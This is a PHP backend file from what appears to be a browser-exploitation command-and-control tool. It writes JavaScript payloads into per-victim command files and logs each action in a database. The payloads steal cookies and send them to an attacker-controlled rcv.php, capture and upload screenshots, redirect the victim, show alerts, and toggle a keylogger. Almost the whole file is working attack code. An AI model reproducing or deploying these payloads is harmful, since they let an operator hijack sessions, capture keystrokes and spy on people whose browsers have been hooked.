<?php
    require_once('database.php');
    connectToDatabase();
?>

<?php
   /*   Add command execution event in bdd "event_browsers"
    *   $browserID = the id browser generated in hook.js
    *   $command = the command that will be execute by victim browser 
    */
    function addCommandExecutionEvent($browserId, $eventType, $module, $event) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO event_browsers (date, browser_id, type, module, event) VALUES (NOW(3), ?, ?, ?, ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("ssss", $browserId, $eventType, $module, $event)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

   /*   Add "steal cookies" payload in command.js file
    *   $browserID = the id browser generated in hook.js
    */
    function stealUserCookies($browserId) { 
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Command Result&module=Core&event=" + btoa(document.cookie);';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Info", "Core", "Stealing user cookies ...");
            return 0;
        }      

        return 1;
    }

   /*   Add "diaply dialog box" payload in command.js file
    *   $browserID = the id browser generated in hook.js
    */
    function displayDialogBox($browserId, $message) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Command Result&module=Core&event=" + btoa("Display of the dialog box successfully");alert("' . $message . '");';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Info", "Core", "Displaying dialog box(\"" . $message . "\") ...");
            return 0;
        }  

        return 1;
    }

    function takeScreenshot($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            $command = '
                html2canvas(document.querySelector("body")).then(canvas => {
                    var dataURL = canvas.toDataURL();               
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Command Result&module=Screenshot&event=" + btoa("Screenshot Done"), true);      
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("imgDataURL=" + dataURL);
                });
            ';
                
            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Info", "Screenshot", "Taking Screenshot ...");
            return 0;
        }  

        return 1;
    }

   /*   Add "redirect" payload in command.js file
    *   $browserID = the id browser generated in hook.js
    */
    function redirect($browserId, $url) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            
            $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Command Result&module=Core&event=" + btoa("User redirected successfully");window.location.replace("' . $url . '");';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Info", "Core", "Redirecting user to " . $url . " ...");
            return 0;
        }  

        return 1;
    }

    function keylogger($browserId, $state) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            if($state === "enable") {
                $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Command Result&module=Keylogger&event=" + btoa("keylogger enabled successfully");document.onkeypress = getOnKeyPress;document.onkeydown = getOnKeyDown;';
            }
            else {
                $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Command Result&module=Keylogger&event=" + btoa("keylogger disabled successfully");document.onkeypress = "";document.onkeydown = "";';              
            }

            file_put_contents($file, $command);

            return 0;
        }  

        return 1;
    }

    function getKeyloggerState($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("SELECT browser_id, keylogger_func FROM keylogger_browsers WHERE browser_id = ?"))) {
                return;
            }

            if (!$stmt->bind_param("s", $browserId)) {
                return;
            }
            
            if(!$stmt->execute()) {
                return;
            }

            $outBrowserId = NULL;
            $outKeyloggerState = NULL;
            $keyloggerState = array();

            $stmt->store_result();
            $stmt->bind_result($outBrowserId, $outKeyloggerState);
            if($stmt->num_rows === 1) { 
                while ($stmt->fetch()) {
                    $keyloggerState[] = array('browserId'=>$outBrowserId, 'state'=>$outKeyloggerState);
                }

                $stmt->free_result();
                $stmt->close(); 

                return $keyloggerState;  
            }
        }  
    }
?>